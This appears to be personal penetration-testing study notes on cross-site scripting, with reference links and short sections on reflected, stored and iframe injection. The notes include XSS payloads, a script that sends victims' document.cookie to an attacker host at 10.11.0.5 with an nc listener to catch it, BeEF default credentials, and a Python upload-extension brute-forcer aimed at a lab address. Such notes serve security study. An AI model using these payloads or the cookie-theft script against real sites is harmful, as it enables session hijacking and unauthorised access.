# Cross-site scripting (XSS)

> Cross-site scripting is a type of computer security vulnerability typically found in web applications. XSS attacks enable attackers to inject client-side scripts into web pages viewed by other users. A cross-site scripting vulnerability may be used by attackers to bypass access controls such as the same-origin policy.  
>
> -- <cite>[Wikipedia](https://en.wikipedia.org/wiki/Cross-site_scripting)</cite>

* [XSS Filter Evasion Cheat Sheet - OWASP](https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet)
* [PayloadsAllTheThings/XSS Injection at master · swisskyrepo/PayloadsAllTheThings · GitHub](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection)
* [GitHub - mandatoryprogrammer/xsshunter: The XSS Hunter service - a portable version of XSSHunter.com](https://github.com/mandatoryprogrammer/xsshunter)
* [http://html5sec.org](http://html5sec.org)


## Reflected (non-persistent)

> Javascript sent in a request, e.g. via query parameters or form data, is reflected in the response.  
E.g.:
```
http://mdsec.net/error/5/Error.ashx?message=<script>alert(1)</script>
```

## Stored (persistent)

> Javascript code gets stored on the server and displayed in an unsafe way to other users.  
E.g.:  
Use `<script>alert(1)</script>` as username.  

Via img: `<img src="." onerror="alert('test');" />`  
Via url: `<a href="javascript:alert('test')>test</a>`

## DOM-based

TODO

## Iframe injection

```html
<iframe src="http://10.11.0.5/report" height="0" width="0"></iframe>
```

## Stealing cookies & sessions
```javascript
<script>
new Image().src="http://10.11.0.5/bogus.php?output="+document.cookie;
</script> 
```

```bash
nc -nlvp 80
```

-> Use session with e.g. CookiesManager+

## BeEF

BeEF is short for The Browser Exploitation Framework. It is a penetration testing tool that focuses on the web browser.  
[BeEF - The Browser Exploitation Framework Project](https://beefproject.com)

Start `./beef`  
Username: beef  
Password: beef

## Cross site request forgery (CSRF)

Python script to read out validation stuff to create other requests

```python
import requests
import re

def TestUpload(filename):
	url = "http://10.10.10.93/transfer.aspx"
	burp = { 'http' : "http://127.0.0.1:8080" }
	s = requests.session()

	r = s.get(url)
	ViewState = re.findall(r'__VIEWSTATE" value="(.*?)"', r.text)[0]
	EventValidation = re.findall(r'__EVENTVALIDATION" value="(.*?)"', r.text)[0]

	post_data = {
		'__VIEWSTATE' : ViewState,
		'__EVENTVALIDATION' : EventValidation,
		'btnUpload' : 'upload'
	}

	uploaded_file = { 'FileUpload1' : (filename, 'contents of file') }
	r = s.post(url, file = uploaded_file, data = post_data, proxies = burp)
	return r.text

for extension in open('extensions.lst', 'r'):
	response = TestUpload('bla' + extension[:-1])
	if "Invalid File" not in response:
		print(extension)

```
